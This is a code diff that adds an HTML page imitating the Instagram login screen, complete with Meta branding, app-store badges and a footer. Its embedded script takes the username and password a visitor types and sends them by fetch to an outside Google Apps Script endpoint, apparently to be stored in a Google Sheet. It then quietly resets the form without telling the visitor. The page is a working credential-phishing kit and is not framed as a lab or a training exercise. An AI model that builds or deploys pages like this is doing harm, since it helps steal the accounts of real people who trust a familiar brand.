@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login • Instagram</title>
+    <link rel="stylesheet" href="login.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Boldonse&family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&family=Lato:ital,wght@0,100;0,300;0,400;0,700;0,900;1,100;1,300;1,400;1,700;1,900&family=Libre+Baskerville:ital,wght@0,400;0,700;1,400&family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&family=Roboto:ital,wght@0,100..900;1,100..900&family=Ubuntu:ital,wght@0,300;0,400;0,500;0,700;1,300;1,400;1,500;1,700&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/x-icon" href='./icons8-instagram-48.png'>
+</head>
+<body>
+    <div id="login">
+    <div class="container">
+        <h1 class="logo">Instagram</h1>
+        <form name="submit-to-google-sheet" id="login-form" novalidate>
+            <input id="username" name="Username" type="text" placeholder="Phone number, email or username" required>
+            <input id="password" name="Password" type="password" placeholder="Password" required>
+            <button type="submit" id="submit">Log in</button>
+        </form>
+        <span id="result"></span>
+        <div class="line-container">
+            <div class="line"><hr></div>
+            <p style="color:rgba(255, 255, 255, 0.6);">OR</p>
+            <div class="line"><hr></div>
+        </div>
+        
+        <a href="#" target="_blank" class="fb"><p><i class="bi bi-facebook" style="color: rgba(24, 119, 242);" ></i> Log in with Facebook</p></a> 
+        <a href="fp.html" target="_blank" class="fp"  style="font-size: 14px; margin-bottom: 10px; padding-bottom:8px;" >Forgot password?</a>
+    </div>
+    <div class="container2">
+        <p style="font-size: 14px;">Don't have an account? <a href="signup.html" target="_blank">Sign up</a></p>
+        </div>
+        <p class="app">Get the app.</p>
+       <div id="application">
+            <div class="apple">
+                <img Src="./google-play.png" alt="Google Play" style="width: 25px; height: 25px; margin-right: 0px; padding:8px;">
+                <a href="https://www.microsoft.com/store/productId/9NBLGGH4V3QW?activetab=pivot:overviewtab" target="_blank" style="padding-right:8px; margin-right: 15px;"><span style="font-size: 9px;">GET IT ON</span><br>Google play</a>
+                <img Src="./microsoft.png" alt="Google Play" style="width: 25px; height: 25px; margin-right: 0px; padding:8px;">
+                <a href="https://www.microsoft.com/store/productId/9NBLGGH4V3QW?activetab=pivot:overviewtab" target="_blank" style="padding-right:8px;"><span style="font-size: 9px;">Get it from</span><br>Microsoft</a>
+            </div>
+            </div>
+                
+        <div class="footer">
+       <a href="#">Meta</a>
+       <a href="#">About</a>
+       <a href="#">Blog</a>
+       <a href="#">Jobs</a>
+       <a href="#">Help</a>
+       <a href="#">API</a>
+       <a href="#">Privacy</a>
+       <a href="#">Terms</a>
+       <a href="#">Locations</a>
+       <a href="#">Instagram Lite</a>
+       <a href="#">Threads</a>
+       <a href="#">Contact Uploading & Non-users</a>
+       <a href="#">Meta Verified</a>
+    </div>
+    <div class="copyright">
+        <p>English <i class="bi bi-caret-down-fill"></i></p>
+        <p>© 2025 Instagram from Meta</p>
+    </div>
+<script>
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbz9mytCnjklzB8V8yTRMlTsMkzojsAlh6Fo9PQy1VqhxQ7-5PkAkorO6OFWTUjeCjLj/exec';
+  const form = document.getElementById('login-form');
+  const result = document.getElementById('result');
+
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+
+    const username = document.getElementById('username').value.trim();
+    const password = document.getElementById('password').value.trim();
+
+    if (!username || !password) {
+      result.textContent = 'Please fill in all fields.';
+      result.style.color = 'red';
+      return;
+    }
+
+    try {
+      const response = await fetch(scriptURL, {
+        method: 'POST',
+        body: new FormData(form),
+      });
+
+      if (response.ok) {
+        result.textContent = '';
+        result.style.color = 'green';
+        form.reset();
+      } else {
+        throw new Error('Failed to send the message.');
+      }
+    } catch (error) {
+      result.textContent = 'An error occurred. Please try again.';
+      result.style.color = 'red';
+      console.error('Error!', error.message);
+    }
+
+    setTimeout(() => {
+      result.textContent = '';
+    }, 1000);
+  });
+</script>
+
+</body>
+</html>
